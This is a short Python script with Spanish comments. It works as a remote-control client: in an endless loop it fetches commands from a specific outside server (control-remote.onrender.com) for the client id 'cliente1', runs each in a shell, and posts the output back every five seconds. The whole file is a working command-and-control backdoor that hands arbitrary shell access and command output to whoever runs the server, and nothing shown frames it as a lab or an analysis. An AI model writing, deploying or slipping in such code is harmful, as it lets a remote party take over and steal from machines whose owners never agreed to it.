import requests
import subprocess
import time

SERVER  = "https://control-remote.onrender.com"
ID      = "cliente1"

while True:
    try:
        # 1. Pedir comando
        r = requests.get(f"{SERVER}/cmd/{ID}", timeout=10)
        comando = r.text.strip()

        if comando:
            print(f"[>] Recibido: {comando}")

            # 2. Ejecutar
            salida = subprocess.getoutput(comando)
            print(f"[<] Resultado:\n{salida}")

            # 3. Enviar resultado al servidor
            requests.post(f"{SERVER}/out/{ID}", data=salida.encode(), timeout=10)

        else:
            print("[=] Sin comando nuevo.")
    except Exception as e:
        print("[!] Error:", e)
    
    time.sleep(5)
